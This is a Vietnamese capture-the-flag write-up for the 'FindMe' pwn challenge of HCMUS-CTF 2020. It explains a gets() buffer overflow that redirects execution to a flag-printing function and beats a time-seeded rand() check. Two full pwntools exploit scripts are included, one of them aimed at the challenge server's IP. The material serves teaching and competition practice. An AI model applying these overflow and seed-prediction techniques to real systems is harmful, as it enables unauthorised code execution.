## ⚡ [FindMe](https://ctf.hcmus.edu.vn/challenges#FindMe)

[![df](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)
[![df](https://img.shields.io/badge/member-viplazy-brightgreen.svg)](https://img.shields.io/badge/member-viplazy-brightgreen.svg)
[![df](https://img.shields.io/badge/108-pts-brightgreen.svg)](https://img.shields.io/badge/108-pts-brightgreen.svg)

Tác giả: `pakkunandy`


Tags: `pwn` `bof` `rand` `ret2text`

<!--
### Challenge Description
-->

### Summary

Đây là challenge về buffer overflow.

Đầu tiên, kiểm tra thông tin binary:

```bash
$ checksec findme
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Chương trình này chạy trên nhân x64, đã tắt hầu hết các bảo vệ.

Mở chương trình với **Ghidra**, ta kiểm tra hàm **main**:

```cpp
undefined8 main(void)

{
  char local_88 [128];
  
  clean();
  puts("Wellcome to HCMUS-CTF 2020! Please tell me your token:");
  gets(local_88);
  puts("So, that\'s your token! You\'re just a normal user :), Bye!!!");
  return 0;
}
```
Hàm này chỉ yêu cầu nhập token thông qua hàm `gets` mà không làm gì cả.  
Như vậy ta sẽ lợi dụng hàm `gets` khi chương trình cố gắng đọc vào vùng nhớ `local_88` trên stack nhưng lại không giới hạn số lượng kí tự nhập để ghi đè địa chỉ trả về của hàm main.


```cpp 
void dont_touch_me(void)

{
  time_t tVar1;
  int local_10;
  int local_c;
  
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  local_c = rand();
  printf("Please tell me your input!!!!");
  __isoc99_scanf(&DAT_00400996,&local_10);
  if (local_c == local_10) {
    system("/bin/cat flag.txt");
  }
  return;
}
```
Ta tìm thêm được thêm hàm **dont_touch_me**, dùng để in ra flag của challenge.  
Tuy nhiên, hàm này có một cái khó là yêu cầu người dùng nhập vào một input `local_10`, nếu bằng `local_c` được random ra thì mới trả về flag.
 
### Exploit #1 

- Tìm vị trí địa chỉ trả về của hàm main
    ```bash
    $ python -c 'print "A"*136 + "BBBBBB"' | strace ./findme
    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x424242424242} ---
    +++ killed by SIGSEGV (core dumped) +++
    Segmentation fault (core dumped)
    ```
    Như vậy, sau **136** bytes offset thì địa chỉ trả về của hàm main (si_addr) bị ghi đè thành "BBBBBB" (là giá trị địa chỉ lệnh không hợp lệ dẫn đến break chương trình).  
    Đối với `x64`, vị trí lưu địa chỉ trả về của hàm có kích thước **6** bytes.


- Lấy địa chỉ của hàm **dont_touch_me**

    ```bash
    $ objdump -t findme | grep dont_touch_me
    000000000040084a g     F .text  0000000000000062              dont_touch_me
    ```

    Kết quả: **`0x00000040084a`**

- Bypass checker

    Ta thấy `local_c` được random với seed luôn là `srand(time(NULL))`, với `time(NULL)` chính là ngày giờ hiện tại theo chuẩn `Unix`. Như vậy, ta cũng có thể viết 1 chương trình giúp rand 1 con số cho `local_10` với cùng seed của server, thì sẽ cho ra cùng một giá trị.

    ```cpp
    // get_rand.c
    int main() {
        int v3;
        srand(time(0));
  
        v3 = rand();

        //printf("%d\n", v3);
        fwrite(&v3, 4, 1, stdout);

        return 0;
    }
    ```  

    Đoạn mã này sẽ trả ra 4 byte biểu diễn giá trị của `local_c` tại thời điểm chạy chương trình.


- Local exploit
    
    Xây dựng payload:

    ```python
        payload = "A" * offset + dont_touch_me_addr + newline + local_c
    ```

    Chạy trên server và lấy flag.

## Exploit #2 

Cách này tương tự như `Exploit #2` của [ChampionLeague](../ChampionLeague/README.md) hay [HackMe](../HackMe/README.md) challenge.  
Thay vì nhảy tới hàm **dont_touch_me**, ta nhảy tới luôn lời gọi hàm system phía trong cho gọn và vẫn lấy được flag. 


## Code #1

```python
#!/usr/bin/env python

from pwn import *

e = ELF("./findme")
dont_touch_me_addr = e.sym["dont_touch_me"]

offset = 136

p = remote("159.65.13.76", 63003)
#p = process("./findme")

payload = 'A' * offset + p64(dont_touch_me_addr)[:-2]

# send buffer overflow
p.recvuntil("token:")
p.sendline(payload)

# get random with srand(time(NULL))'s seed
rand_int = process("./get_rand")
rand_bytes = rand_int.recv(4)

#local_c's size is 4 bytes long
local_c = int.from_bytes(rand_bytes, byteorder='little', signed=True)

# send n
p.sendline(p32(local_c))
p.interactive()

```

## Code #2

```python
#!/usr/bin/env python

from pwn import *

e = ELF("./findme")
offset = 136

#p = remote("159.65.13.76", 63003)
p = process("./findme")

system_addr = 0x40089c

payload = 'A' * offset + p64(system_addr)
p.recvuntil("token:")

p.sendline(payload)
p.interactive()
```

📫 Flag: **`HCMUS-CTF{}`**

---
*[Back to table of contents](../README.md)*
